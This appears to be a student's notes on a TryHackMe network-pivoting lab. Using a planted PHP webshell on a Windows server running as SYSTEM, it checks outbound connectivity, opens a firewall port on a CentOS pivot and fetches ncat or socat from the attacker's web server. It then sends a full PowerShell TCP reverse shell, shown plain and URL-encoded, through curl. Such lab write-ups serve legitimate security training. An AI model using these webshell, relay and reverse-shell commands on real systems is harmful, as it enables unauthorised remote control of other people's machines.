In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.

![[Exploitation-20241222141211867.webp]]

Success!

Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

From here we want to obtain a full reverse shell. We have two options for this:

1. We could change the command in the exploit and re-run the code
2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice

Option number two is a lot quieter than option number 1, so let's use that.

---

![[Diagram.svg]]


---

The webshell we have uploaded responds to a POST request using the parameter "`a`" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.

## With cURL  
`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`

![[Exploitation-20241222145319679.webp]]

> [!Note]
>In this screenshot,_`gitserver.thm` has been added to the `/etc/hosts` file on the attacking machine, mapped to the target IP address.


## With BurpSuite
We first turn on our Burp proxy (see the [Burpsuite room](https://tryhackme.com/room/rpburpsuite) if you need help with this!) and navigate to the exploit URL:

![[Exploitation-20241222145720411.webp]]

Press send, and see the response come in!

![[Exploitation-20241222145746536.webp]]

With two methods available, pick your favorite and we'll aim for a shell!


---

# Your job

Rememeber, from the attacking machine you are connected via [[sshuttle]] to the whole internal network, so you have access to any machine on that network.

```
$ sshuttle -r root@10.200.84.200 --ssh-cmd "ssh -i id_rsa" 10.200.84.0/24 -x 10.200.84.200
```


- Create a webshell with cURL.
	`curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=whoami"`
	
	![[Exploitation-20241222152701712.webp]]
- Check the target for information.
	`curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=systeminfo"`
	 ![[Exploitation-20241222152545435.webp]]

> [!Question]
>1. First up, let's use some basic enumeration to get to grips with the webshell: What is the hostname for this target?
>`git-serv`
>2. What operating system is this target?
>`Windows`
>3. What user is the server running as?
>`NT AUTHORITY\SYSTEM`


Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the `ping` command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.

**On the attacking machine:**
To start up a TCPDump listener we would use the following command:  
`tcpdump -i tun0 icmp`  

> [!Note]
>If your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using `ip -a link` to see the available interfaces.

Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):  
`ping -n 3 ATTACKING_IP`

Run:
$ `curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=ping -n 3 10.50.85.33"`

![[Exploitation-20241224144002376.webp]]

> [!Question]
> 4. How many make it to the waiting listener?
> `0`


---

Looks like we're going to need to think outside the box to catch this shell.

We have two easy options here:

- Given we have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here.
- We could set up a relay on .200 to forward a shell back to a listener.

It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and **ensure that any ports you open are above 15000.**

## Firewall

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:  
`firewall-cmd --zone=public --add-port PORT/tcp`  
Substituting in your desired choice of port.

In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).

With that done, set up either a listener or a relay on .200.


> [!Hint]
> Either upload a static copy of netcat, or perform a socat relay (described in task 13). If performing a socat relay you will need to relay the connection back to an open port on your attacking machine.


- Create a Firewall rule.
	- Connect to the prod-server (10.200.84.200) via SSH.
		$ `ssh root@10.200.84.200 -i id_rsa`
	- Create a Firewall rule to allow connections through.
		root@prod-serv ~# `firewall-cmd --zone=public --add-port 23337/tcp`

## netcat

Get **ncat** binary from attacker machine.
- Download ncat from https://github.com/andrew-d/static-binaries.git.
	$ `git clone https://github.com/andrew-d/static-binaries.git`

- Open a Python Webserver.
	$ `sudo python3 -m http.server 80`

- On the Reverse Shell terminal get the binary from the attacking machine:
	root@prod-serv ~# `curl 10.50.85.33/ncat -o /tmp/ncat-sv && chmod +x /tmp/ncat-sv`

- Open a listener on the Reverse Shell.
	root@prod-serv tmp# `./ncat-sv -nvlp 23337`
	
	![[Exploitation-20241228144252431.webp]]

## Socat relay
- On Kali Linux socat's path is `/usr/bin/socat1`.

- Copy that file to your working directory.

- Rename it to `socat-KAIROS`.

- Open a Python Webserver.
	$ `sudo python3 -m http.server 80`

- On the Reverse Shell terminal run:
	root@prod-serv ~# `curl 10.50.85.33/socat-KAIROS -o /tmp/socat-KAIROS && chmod +x /tmp/socat-KAIROS`

- Open a netcat listener on our Kali machine on port 443.
	$ `nc -lnvp 443`

- Create the connection back to the attacking machine.
	`./socat tcp-l:16000 tcp:10.50.85.33:443 &`


## Powershell/Reverse Shell

Let's go for a reverse shell!

We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:  
`powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:

![[Exploitation-20241227145127952.webp]]

If you are using cURL then there are a variety of options available. cURL does provide a `--data-urlencode` switch; however, it's often easiest to just use a [website](https://www.urlencoder.org/) to encode the shell command, then copy it in with the `-d` switch:

![[Exploitation-20241227145225967.webp]]

Pick a method (cURL, BurpSuite, or any others) and get a shell!


### Use cURL

- Encode the shell command on https://www.urlencoder.org/.
	![[Exploitation-20241228143653085.webp]]

- On the attacking machine run the following code:

```
curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C23337%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```


#### Command Explanation

1. `curl`: A command-line tool to send HTTP/HTTPS requests.
2. `-X POST`: Specifies the HTTP method (`POST`), typically used to send data to a server.
3. `http://10.200.84.150/web/exploit-KAIROS.php`: The URL of the server's endpoint, specifically targeting the script `exploit-KAIROS.php` in the `/web/` directory on the host `10.200.84.150`.
4. `-d`: Indicates the **data payload** being sent with the request. The actual data to send would follow this flag.


- On the netcat Reverse Shell you'll see you are connected.

	![[Exploitation-20241228144456255.webp]]

- **Bonus Question (Optional):** Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.


**Next step:** [[Stabilisation & Post Exploitation]]
